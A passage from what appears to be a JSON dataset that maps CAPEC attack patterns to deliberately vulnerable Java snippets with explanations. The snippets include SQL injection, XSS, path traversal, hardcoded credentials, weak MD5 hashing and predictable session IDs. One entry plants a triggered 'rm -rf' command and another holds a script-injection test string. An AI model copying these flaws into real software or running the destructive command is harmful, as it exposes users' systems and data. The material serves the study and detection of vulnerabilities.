        "code_snippet": "public class AuthenticationSystem {\n    private static final String SALT = \"fixed_salt\";\n    \n    public boolean authenticateUser(String username, String password) {\n        // Simple MD5 hashing with fixed salt\n        String hashedPassword = md5Hash(password + SALT);\n        \n        // Query database for stored hash\n        String storedHash = getStoredHashFromDatabase(username);\n        \n        // Simple string comparison of hashes\n        return hashedPassword.equals(storedHash);\n    }\n    \n    private String md5Hash(String input) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\");\n            byte[] hash = md.digest(input.getBytes());\n            return DatatypeConverter.printHexBinary(hash);\n        } catch (NoSuchAlgorithmException e) {\n            return null;\n        }\n    }\n    \n    private String getStoredHashFromDatabase(String username) {\n        // Simulated database query\n        return \"stored_hash_value\";\n    }\n}",
        "description": "This vulnerable code demonstrates weak password storage by using MD5 (a fast hashing algorithm) with a fixed salt, making it susceptible to rainbow table attacks. It also implements single-factor authentication and lacks password aging mechanisms. The hashing implementation uses minimal computational effort, making it feasible for attackers to crack passwords using pre-computed hash tables."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "public class ClientAuthenticator {\n    private boolean isLoggedIn = false;\n    \n    public void login(String username, String password) {\n        // Client-side only authentication\n        if(username.equals(\"admin\") && password.equals(\"password123\")) {\n            isLoggedIn = true;\n        }\n    }\n    \n    public void performSecureOperation() {\n        // Critical operation relies only on client-side state\n        if(isLoggedIn) {\n            // Perform sensitive operation\n            transferFunds(1000);\n        }\n    }\n    \n    private void transferFunds(int amount) {\n        // Sensitive operation with no server-side validation\n        System.out.println(\"Transferring $\" + amount);\n    }\n}",
        "description": "This code demonstrates vulnerable client-side authentication where critical security checks are performed only on the client side. The authentication state is maintained in a client-side boolean variable that can be easily manipulated, and sensitive operations rely solely on this client-side state without server validation. This makes it trivial for an attacker to bypass authentication by modifying the client-side code or state."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "public class RestApiController {\n    @GetMapping(\"/api/user/info\")\n    public ResponseEntity<UserData> getUserData(@RequestParam String ssn, @RequestParam String token) {\n        // No SSL verification\n        // No proper authentication check\n        if(token != null) {\n            UserData userData = userService.fetchUserDataBySsn(ssn);\n            \n            // Sensitive data exposed in GET request URL\n            return ResponseEntity.ok()\n                .header(\"X-Auth\", token)\n                .body(userData);\n        }\n        return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();\n    }\n\n    @Component\n    public class UserService {\n        // Critical state data stored in memory cache\n        private static Map<String, UserData> userCache = new HashMap<>();\n        \n        public UserData fetchUserDataBySsn(String ssn) {\n            return userCache.get(ssn);\n        }\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities in a REST API endpoint. It uses GET method with sensitive parameters (SSN), performs inadequate authentication (simple token check), lacks proper SSL verification, and stores critical user data in an accessible memory cache. The endpoint is susceptible to man-in-the-middle attacks after SSL termination and exposes sensitive information in URL parameters."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "@RestController\n@RequestMapping(\"/api/user\")\npublic class UserController {\n    \n    @Autowired\n    private UserService userService;\n    \n    @GetMapping(\"/delete/{userId}\")\n    public ResponseEntity<String> deleteUser(@PathVariable Long userId) {\n        // No authentication or authorization check\n        // Using GET method for state-changing operation\n        userService.deleteUserData(userId);\n        return ResponseEntity.ok(\"User deleted\");\n    }\n    \n    @GetMapping(\"/admin/grant-privileges\")\n    public ResponseEntity<String> grantAdminPrivileges(@RequestParam String username) {\n        // No role verification\n        // State-changing operation via GET\n        User user = userService.findByUsername(username);\n        user.setRole(\"ADMIN\");\n        userService.save(user);\n        return ResponseEntity.ok(\"Admin privileges granted\");\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: using GET methods for state-changing operations, lack of proper authentication/authorization checks, and improper privilege management. The endpoints allow deletion of user data and privilege escalation without proper access controls or HTTP method restrictions."
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "public class SessionManager {\n    private static int sessionCounter = 1;\n    private static final String COOKIE_DOMAIN = \"example.com\";\n\n    public static String createSessionId(HttpServletRequest request) {\n        // Predictable session ID generation using incremental counter\n        String sessionId = \"SESSION_\" + sessionCounter++;\n        \n        // Create a persistent cookie with the session ID\n        Cookie sessionCookie = new Cookie(\"SESSIONID\", sessionId);\n        sessionCookie.setDomain(COOKIE_DOMAIN);\n        sessionCookie.setMaxAge(365 * 24 * 60 * 60); // 1 year\n        sessionCookie.setSecure(false);\n        \n        // Store sensitive data in session\n        HttpSession session = request.getSession(true);\n        session.setAttribute(\"userRole\", \"admin\");\n        session.setAttribute(\"creditCard\", \"1234-5678-9012-3456\");\n        \n        return sessionId;\n    }\n\n    public static boolean validateSession(String sessionId) {\n        // No proper validation of session origin\n        return sessionId.startsWith(\"SESSION_\");\n    }\n}",
        "description": "This vulnerable code demonstrates a predictable session ID generation mechanism using a simple incremental counter. The code creates persistent cookies with sensitive information, lacks proper session validation, and doesn't implement sufficient entropy in session ID generation. It also exposes sensitive data and fails to properly invalidate existing sessions."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "public class UserSessionManager {\n    private static Map<String, UserSession> sessions = new HashMap<>();\n\n    public static String createSession(String username) {\n        String sessionId = UUID.randomUUID().toString();\n        // Vulnerable: Not invalidating existing sessions\n        sessions.put(sessionId, new UserSession(username));\n        // Vulnerable: Using persistent cookie with sensitive data\n        Cookie sessionCookie = new Cookie(\"sessionId\", sessionId);\n        sessionCookie.setMaxAge(365 * 24 * 60 * 60); // 1 year\n        return sessionId;\n    }\n\n    public static boolean isValidSession(String sessionId) {\n        // Vulnerable: No timestamp validation or session expiry\n        // Vulnerable: No origin validation\n        return sessions.containsKey(sessionId);\n    }\n\n    public static void executeAction(String sessionId, String action) {\n        // Vulnerable: No session replay protection\n        if (isValidSession(sessionId)) {\n            UserSession session = sessions.get(sessionId);\n            // Vulnerable: No proper authorization check\n            performAction(action);\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to session management and authentication. It lacks session invalidation, uses persistent cookies with sensitive data, has no protection against session replay attacks, and performs inadequate session validation. The code allows reuse of session IDs without proper checks for expiration or origin validation, making it susceptible to session hijacking and replay attacks."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "public class SessionManager {\n    private static Map<String, UserSession> sessions = new HashMap<>();\n\n    public static void login(String sessionId, String username, String password) {\n        // Accepts client-provided sessionId without validation\n        if (authenticateUser(username, password)) {\n            // Reuses existing session ID after authentication\n            UserSession session = new UserSession(username, true);\n            sessions.put(sessionId, session);\n        }\n    }\n\n    public static boolean isAuthenticated(String sessionId) {\n        UserSession session = sessions.get(sessionId);\n        return session != null && session.isAuthenticated();\n    }\n\n    private static boolean authenticateUser(String username, String password) {\n        // Authentication logic here\n        return true;\n    }\n}\n\nclass UserSession {\n    private String username;\n    private boolean authenticated;\n\n    public UserSession(String username, boolean authenticated) {\n        this.username = username;\n        this.authenticated = authenticated;\n    }\n\n    public boolean isAuthenticated() {\n        return authenticated;\n    }\n}",
        "description": "This vulnerable code demonstrates session fixation by allowing client-provided session IDs and not regenerating them after authentication. The session manager accepts any session identifier from the client and maintains it even after successful authentication. This allows an attacker to provide a known session ID to a victim, wait for them to authenticate, and then use the same session ID to gain unauthorized access to the authenticated session."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "public class UserAccountServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        Cookie[] cookies = request.getCookies();\n        String sessionId = null;\n        \n        // Find session cookie without validating origin\n        for(Cookie cookie : cookies) {\n            if(cookie.getName().equals(\"sessionId\")) {\n                sessionId = cookie.getValue();\n                break;\n            }\n        }\n        \n        // No CSRF token validation\n        String action = request.getParameter(\"action\");\n        if(\"transferFunds\".equals(action)) {\n            String toAccount = request.getParameter(\"toAccount\");\n            double amount = Double.parseDouble(request.getParameter(\"amount\"));\n            \n            // Critical operation without proper authentication or CSRF protection\n            bankService.transferFunds(sessionId, toAccount, amount);\n            \n            // Set cookie without proper SameSite attribute\n            Cookie transactionCookie = new Cookie(\"lastTransaction\", toAccount);\n            transactionCookie.setHttpOnly(false);\n            response.addCookie(transactionCookie);\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable servlet that processes financial transactions without proper CSRF protection. It relies solely on session cookies for authentication, doesn't validate the request origin, and sets cookies without proper SameSite attributes. The code is susceptible to CSRF attacks where an attacker can trick authenticated users into performing unintended fund transfers through malicious links."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "public class CommentProcessor {\n    @WebServlet(\"/comments\")\n    public class CommentServlet extends HttpServlet {\n        protected void doPost(HttpServletRequest request, HttpServletResponse response) {\n            try {\n                String userComment = request.getParameter(\"comment\");\n                // Vulnerable: Direct use of unvalidated input in HTML response\n                String htmlResponse = \"<div class='comment'>\" + userComment + \"</div>\";\n                \n                // Store comment in database\n                DatabaseUtil.storeComment(userComment);\n                \n                // Display all comments including the new one\n                response.setContentType(\"text/html\");\n                PrintWriter out = response.getWriter();\n                out.println(\"<html><body>\");\n                out.println(\"<h2>Comments:</h2>\");\n                out.println(htmlResponse);\n                out.println(\"</body></html>\");\n            } catch (Exception e) {\n                // Vulnerable: Error message displays unescaped input\n                response.getWriter().println(\"Error processing comment: \" + request.getParameter(\"comment\"));\n            }\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a typical XSS vulnerability in a comment processing system. It accepts user input without proper validation or sanitization and directly embeds it into the HTML response. The code is vulnerable in two ways: it doesn't sanitize user input before displaying it in the main page, and it echoes unsanitized input in error messages. This allows attackers to inject malicious scripts that will be executed in other users' browsers."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "public class FileDownloader {\n    public void downloadFile(HttpServletRequest request, HttpServletResponse response) {\n        String filePath = request.getParameter(\"file\");\n        \n        if (filePath != null) {\n            // Attempt to \"sanitize\" by simple string replacement\n            filePath = filePath.replace(\"%2E\", \".\");\n            filePath = filePath.replace(\"%2F\", \"/\");\n            \n            // Vulnerable: doesn't handle multiple encodings or other variants\n            File file = new File(\"/home/webapp/files/\" + filePath);\n            \n            if (file.exists()) {\n                try (FileInputStream fis = new FileInputStream(file)) {\n                    byte[] buffer = new byte[4096];\n                    int bytesRead;\n                    while ((bytesRead = fis.read(buffer)) != -1) {\n                        response.getOutputStream().write(buffer, 0, bytesRead);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates improper handling of URL encoding in a file download function. It attempts basic sanitization of encoded characters but fails to handle multiple encodings, Unicode, or other URL encoding variants. An attacker could use double-encoding or alternate encodings to bypass the simple replacement and potentially access files outside the intended directory through path traversal."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
        "code_snippet": "public class UpdateManager {\n    private static final String UPDATE_SERVER = \"http://updates.example.com\";\n\n    public void downloadAndInstallUpdate() {\n        try {\n            URL url = new URL(UPDATE_SERVER + \"/latest/update.jar\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            \n            InputStream in = conn.getInputStream();\n            FileOutputStream out = new FileOutputStream(\"update.jar\");\n            \n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            \n            out.close();\n            in.close();\n            \n            // Load and execute the update\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{new File(\"update.jar\").toURI().toURL()});\n            Class<?> updateClass = classLoader.loadClass(\"com.example.Update\");\n            updateClass.getMethod(\"apply\").invoke(null);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable update functionality that downloads and executes code from a remote server without proper security measures. It uses unencrypted HTTP, performs no integrity verification of downloaded code, and executes the downloaded code immediately. The code is susceptible to man-in-the-middle attacks, tampering, and execution of malicious code."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "public class UserAuthentication {\n    private Connection conn;\n\n    public boolean authenticateUser(String username, String password) {\n        try {\n            String query = \"SELECT * FROM users WHERE username = '\" + username + \n                          \"' AND password = '\" + password + \"'\";\n            \n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n            \n            if(rs.next()) {\n                System.out.println(\"Login details: \" + query);\n                return true;\n            }\n            return false;\n        } catch(SQLException e) {\n            e.printStackTrace();\n            System.out.println(\"Database error: \" + e.getMessage());\n            return false;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates classic SQL injection through direct string concatenation of user input into SQL queries, improper input validation, and exposure of sensitive information in error messages. The code fails to use prepared statements or input sanitization, allows complete SQL statement manipulation, and prints both query details and database errors that could aid attackers."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "public class LoggerUtil {\n    public void logUserActivity(String userId, String userInput) {\n        String logMessage = \"User \" + userId + \": \" + userInput;\n        syslog(LOG_INFO, logMessage);\n    }\n\n    private native void syslog(int priority, String message);\n\n    public static void main(String[] args) {\n        LoggerUtil logger = new LoggerUtil();\n        String userInput = args[0];\n        // Vulnerable: Direct use of user input in syslog without format string\n        // and without input validation\n        logger.logUserActivity(\"12345\", userInput);\n    }\n}",
        "description": "This code demonstrates an insecure use of syslog() where user input is directly passed to the logging function without proper format string usage or input validation. An attacker could provide malicious format specifiers in the userInput parameter, potentially leading to format string injection and buffer overflow vulnerabilities."
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "public class WeakCodeSigning {\n    private static final String WEAK_HASH = \"MD5\";\n    \n    public static boolean verifyCodeSignature(byte[] code, byte[] signature) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(WEAK_HASH);\n            byte[] computedHash = md.digest(code);\n            \n            // Skip certificate chain validation\n            // Missing root of trust verification\n            boolean skipTrustCheck = true;\n            \n            if(skipTrustCheck) {\n                // Simple byte comparison without timing-safe check\n                return Arrays.equals(computedHash, signature);\n            }\n            return false;\n        } catch(NoSuchAlgorithmException e) {\n            return true; // Fallback to allow execution without verification\n        }\n    }\n    \n    public static void loadAndExecute(byte[] code, byte[] signature) {\n        if(verifyCodeSignature(code, signature)) {\n            // Unsafe dynamic code execution\n            CustomClassLoader loader = new CustomClassLoader();\n            loader.defineClass(\"MaliciousCode\", code, 0, code.length);\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities in code signing implementation including use of weak hash (MD5), missing cryptographic steps in signature verification, skipping root of trust validation, and unsafe code loading. The verification can be bypassed due to weak hash algorithm and missing security checks, allowing execution of potentially malicious code."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "public class SystemConfigManager {\n    static {\n        System.loadLibrary(\"customlib\");\n    }\n\n    public void updateSystemConfig(String configPath, String newValue) {\n        try {\n            // Run with elevated privileges\n            Runtime.getRuntime().exec(\"sudo chmod 777 \" + configPath);\n            \n            // Execute system command with user input\n            String command = \"echo \" + newValue + \" > \" + configPath;\n            Process process = Runtime.getRuntime().exec(new String[]{\"bash\", \"-c\", command});\n            \n            // Hidden malicious payload\n            if(newValue.contains(\"special_trigger\")) {\n                Runtime.getRuntime().exec(\"rm -rf /important/files\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "A vulnerable system configuration manager that runs with elevated privileges, accepts untrusted input, and contains hidden malicious code. It demonstrates privilege escalation, OS command injection, and embedded malicious code vulnerabilities by executing system commands without proper input validation and running with unnecessary elevated privileges."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "public class UserAuthentication {\n    private static final String ADMIN_USERNAME = \"admin\";\n    private static final String ADMIN_PASSWORD = \"admin123\";\n    \n    public boolean authenticateUser(String username, String password) {\n        if (username == null || password == null) {\n            return false;\n        }\n        \n        // Check against hardcoded credentials\n        if (username.equals(ADMIN_USERNAME) && password.equals(ADMIN_PASSWORD)) {\n            return true;\n        }\n        \n        // Simple password check without complexity requirements\n        User user = getUserFromDatabase(username);\n        if (user != null) {\n            return user.getPassword().equals(password);\n        }\n        \n        return false;\n    }\n    \n    private User getUserFromDatabase(String username) {\n        // Database lookup simulation\n        return null;\n    }\n}",
        "description": "This code demonstrates several security vulnerabilities including hardcoded credentials, lack of password complexity requirements, single-factor authentication, and plain text password comparison. It uses default admin credentials and performs simple string comparison for password verification without any hashing or salting, making it susceptible to credential stuffing and brute force attacks."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "public class UnicodeValidator {\n    private static final String[] BLOCKED_CHARS = {\"<\", \">\", \"&\", \"'\"};\n\n    public static boolean isValidInput(String input) {\n        // Validate input before normalization\n        for (String blocked : BLOCKED_CHARS) {\n            if (input.contains(blocked)) {\n                return false;\n            }\n        }\n\n        // Unicode normalization happens after validation\n        String normalized = java.text.Normalizer.normalize(input, java.text.Normalizer.Form.NFKC);\n\n        // Process the input\n        processInput(normalized);\n        return true;\n    }\n\n    private static void processInput(String input) {\n        // Process the potentially dangerous input\n        System.out.println(\"Processing: \" + input);\n    }\n\n    public static void main(String[] args) {\n        // Attacker input using Unicode encoding\n        String maliciousInput = \"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\";\n        if (isValidInput(maliciousInput)) {\n            System.out.println(\"Input accepted\");\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates improper handling of Unicode encoding by validating input before normalization. The code checks for blocked characters but fails to account for Unicode-encoded equivalents. An attacker can bypass the security check using Unicode-encoded characters (e.g., \\u003C for '<'), which are only normalized after validation. The validation occurs too early in the process, before canonicalization, allowing malicious content to pass through."
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "public class FileDownloader {\n    public void downloadFile(HttpServletRequest request) {\n        String fileName = request.getParameter(\"file\");\n        File file = new File(\"/var/www/files/\" + fileName);\n        \n        if (file.exists()) {\n            try {\n                FileInputStream fis = new FileInputStream(file);\n                byte[] buffer = new byte[4096];\n                int bytesRead;\n                \n                while ((bytesRead = fis.read(buffer)) != -1) {\n                    // Process file contents\n                }\n                fis.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This code is vulnerable to URL encoding attacks and path traversal. It accepts a file parameter from the request without decoding or validating URL-encoded characters. An attacker could use encoded '../' sequences (%2E%2E%2F) to traverse directories and access files outside the intended directory. The code also lacks input validation and proper handling of special characters in the file path."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "public class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"filename\");\n        Part filePart = request.getPart(\"file\");\n        \n        // Vulnerable: No validation of filename\n        String htmlContent = \"<html><body><h1>File: \" + fileName + \"</h1>\";\n        htmlContent += \"<a href='downloads/\" + fileName + \"'>Download</a></body></html>\";\n        \n        // Save file\n        String uploadPath = getServletContext().getRealPath(\"/uploads/\");\n        filePart.write(uploadPath + File.separator + fileName);\n        \n        // Output potentially dangerous content directly\n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(htmlContent);\n    }\n}",
        "description": "This code demonstrates a vulnerable file upload implementation where an attacker can inject malicious characters into the filename parameter. The code fails to validate or sanitize the filename before using it in HTML output, allowing for XSS attacks. The filename is directly embedded into HTML without proper encoding, and there's no validation of allowed characters or file extensions."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "public class UserSession {\n    private static String userRole = \"guest\";\n    private static boolean isLoggedIn = false;\n    private static Cookie sessionCookie;\n    \n    public static void login(String username, String password) {\n        if(authenticate(username, password)) {\n            isLoggedIn = true;\n            userRole = getUserRole(username);\n            sessionCookie = new Cookie(\"auth\", username + \":\" + userRole);\n            sessionCookie.setSecure(false);\n        }\n    }\n    \n    public static void processUserAction(String action) {\n        // No state validation or synchronization\n        if(action.equals(\"admin_action\")) {\n            executeAdminAction();\n        }\n    }\n    \n    private static void executeAdminAction() {\n        // Missing state check, assumes current state is valid\n        if(userRole != null) {  // Insufficient check\n            performPrivilegedOperation();\n        }\n    }\n    \n    private static synchronized void performPrivilegedOperation() {\n        // Can be called recursively without proper state management\n        processUserAction(\"admin_action\");\n    }\n}",
        "description": "This code demonstrates multiple state management vulnerabilities including storing sensitive data in cleartext cookies, insufficient state validation, improper privilege checks, and potential reentrant code issues. The static variables managing state can be manipulated, there's no integrity checking of the session state, and the authentication state can be confused due to improper state transitions."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "public class ConfigManager {\n    private static final String CONFIG_PATH = \"/etc/app/config/\";\n    \n    public static void updateConfig(String filename, String content, String checksum) {\n        try {\n            String filePath = CONFIG_PATH + filename;\n            \n            // Directly using user-provided filename without validation\n            FileWriter writer = new FileWriter(filePath);\n            \n            // Not validating source of content or checksum\n            writer.write(content);\n            writer.close();\n            \n            // No integrity validation of content against checksum\n            Process process = Runtime.getRuntime().exec(\"chmod 644 \" + filePath);\n            process.waitFor();\n            \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a configuration file manager that accepts untrusted input for filename and content without proper validation. It exhibits multiple vulnerabilities including resource injection (using unvalidated file paths), command injection (using unvalidated input in system commands), missing integrity checks, and acceptance of untrusted data. The code doesn't verify the origin of the data or validate checksums, allowing potential unauthorized modifications to sensitive configuration files."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "public class FileManager {\n    public void accessUserFile(String userInput) {\n        String basePath = \"/home/app/userfiles/\";\n        String filePath = basePath + userInput;\n        \n        try {\n            File file = new File(filePath);\n            FileInputStream fis = new FileInputStream(file);\n            String command = \"cat \" + filePath;\n            Process process = Runtime.getRuntime().exec(command);\n            \n            // Read and process file contents\n            BufferedReader reader = new BufferedReader(new InputStreamReader(fis));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates path traversal and command injection vulnerabilities. It directly concatenates user input into a file path without sanitization, allowing potential directory traversal attacks using '../' sequences. It also uses unsanitized input in a system command, enabling command injection. The code lacks proper authorization checks and input validation, potentially allowing access to files outside the intended directory structure."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "public class ConfigurationManager {\n    private static Map<String, String> config = new HashMap<>();\n    \n    static {\n        config.put(\"DEBUG\", \"false\");\n        config.put(\"ADMIN_ROLE\", \"false\");\n        config.put(\"DB_CONNECTION\", \"prod_db\");\n    }\n    \n    public static void updateConfig(HttpServletRequest request) {\n        String debugParam = request.getParameter(\"DEBUG\");\n        String roleParam = request.getParameter(\"ADMIN_ROLE\");\n        String dbParam = request.getParameter(\"DB_CONNECTION\");\n        \n        if (debugParam != null) config.put(\"DEBUG\", debugParam);\n        if (roleParam != null) config.put(\"ADMIN_ROLE\", roleParam);\n        if (dbParam != null) config.put(\"DB_CONNECTION\", dbParam);\n    }\n    \n    public static boolean isAdmin() {\n        return Boolean.parseBoolean(config.get(\"ADMIN_ROLE\"));\n    }\n    \n    public static String getDbConnection() {\n        return config.get(\"DB_CONNECTION\");\n    }\n}",
        "description": "This vulnerable code allows direct modification of critical system configuration settings through HTTP parameters without any validation or authorization checks. An attacker can manipulate admin privileges, debug settings, and database connections by simply sending crafted HTTP requests. The code demonstrates CWE-15 (external control of system settings), CWE-285 (improper authorization), and CWE-302 (authentication bypass) by allowing unauthenticated modification of security-critical configuration values."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "public class FileProcessor {\n    public boolean validateAndProcessFile(String fileName) {\n        if (fileName.startsWith(\"\\\\\")) {\n            // Simple validation check that fails to catch encoded paths\n            return false;\n        }\n        \n        // Vulnerable: validates before decoding/canonicalizing\n        if (fileName.contains(\"../\")) {\n            return false;\n        }\n        \n        try {\n            // Decoding after validation allows bypass\n            String decodedPath = java.net.URLDecoder.decode(fileName, \"UTF-8\");\n            java.io.File file = new java.io.File(\"base/directory/\" + decodedPath);\n            \n            // Process file contents\n            return file.exists();\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This code is vulnerable to path traversal through backslash encoding attacks. It validates the input before decoding, allowing attackers to bypass security checks using encoded characters. For example, an attacker could provide '%2E%2E%2F' (encoded '../') or use backslash escapes to bypass the validation checks. The code also fails to properly canonicalize the path before validation, making it susceptible to alternate encoding attacks."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "public class FileAccessServlet extends HttpServlet {\n    private static final String BASE_PATH = \"/secure/documents/\";\n    \n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"file\");\n        if (fileName != null) {\n            // Vulnerable: Inadequate path validation and lack of proper encoding handling\n            fileName = fileName.replace(\"\\\\\", \"/\");\n            \n            // Attempt to block basic path traversal, but misses alternate encodings\n            if (!fileName.contains(\"../\")) {\n                File file = new File(BASE_PATH + fileName);\n                if (file.exists()) {\n                    FileInputStream fis = new FileInputStream(file);\n                    IOUtils.copy(fis, response.getOutputStream());\n                    fis.close();\n                }\n            }\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates improper handling of file paths and alternate encodings. It attempts to normalize backslashes to forward slashes but fails to properly validate the path or handle various encoded forms of path traversal. The code also performs validation before canonicalization and lacks proper input sanitization, allowing potential directory traversal attacks through various slash representations and encoded characters."
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "public class FileProcessor {\n    public static void processUserInput(String userInput) {\n        try {\n            // Incorrect validation before decoding\n            if (userInput.matches(\"^[a-zA-Z0-9._-]+$\")) {\n                // Decode UTF-8 input after validation\n                byte[] bytes = userInput.getBytes(\"UTF-8\");\n                String decodedInput = new String(bytes, \"UTF-8\");\n                \n                // Use decoded input in file operations without proper sanitization\n                File file = new File(\"/path/to/files/\" + decodedInput);\n                if (file.exists()) {\n                    // Process file content\n                    BufferedReader reader = new BufferedReader(new FileReader(file));\n                    String content = reader.readLine();\n                    // Vulnerable to XSS when content is displayed\n                    displayContent(content);\n                    reader.close();\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static void displayContent(String content) {\n        // Output potentially malicious content directly\n        System.out.println(content);\n    }\n}",
        "description": "This vulnerable code demonstrates improper handling of UTF-8 encoded input by validating before decoding, which allows attackers to bypass security checks using alternate encodings. It also shows unsafe file operations with user input and potential XSS vulnerabilities. The code fails to properly validate input after decoding and uses incomplete validation patterns."
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "public class WebLogManager {\n    private static final Logger logger = Logger.getLogger(WebLogManager.class.getName());\n    \n    public void logUserActivity(String userId, String action) {\n        String logEntry = userId + \": \" + action;\n        logger.info(logEntry);\n    }\n    \n    public void logAccessAttempt(HttpServletRequest request) {\n        String userInput = request.getParameter(\"data\");\n        String ipAddress = request.getRemoteAddr();\n        String logMessage = ipAddress + \" - \" + userInput;\n        \n        try {\n            FileWriter fw = new FileWriter(\"access.log\", true);\n            fw.write(logMessage + \"\\n\");\n            fw.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public void setLogPermissions(String logPath) {\n        File logFile = new File(logPath);\n        logFile.setWritable(true, false);\n        logFile.setReadable(true, false);\n    }\n}",
        "description": "This vulnerable code demonstrates insecure logging practices including: direct writing of unvalidated user input to log files (CWE-117), lack of CRLF sequence neutralization (CWE-93), missing input validation (CWE-20), and incorrect file permissions (CWE-276). The code allows unrestricted write access to log files and doesn't sanitize user input before logging, making it susceptible to log injection and tampering attacks."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "public class XMLProcessor {\n    public String processXMLDocument(String xmlInput) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            // Vulnerable: No validation against schema\n            // Vulnerable: XXE enabled by default\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            \n            // Vulnerable: Direct processing of untrusted XML input\n            Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));\n            \n            // Vulnerable: No input sanitization for XML injection\n            XPath xpath = XPathFactory.newInstance().newXPath();\n            String result = xpath.evaluate(\"/user/text()\", doc);\n            \n            return result;\n        } catch (Exception e) {\n            return \"Error processing XML\";\n        }\n    }\n}",
        "description": "This code demonstrates multiple XML-related vulnerabilities including: missing XML validation against schema (CWE-112), susceptibility to XML injection (CWE-91), XML external entity (XXE) processing enabled by default (CWE-611), and potential recursive entity expansion (CWE-776). The code processes XML input without proper validation or sanitization, making it vulnerable to various XML-based attacks."
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
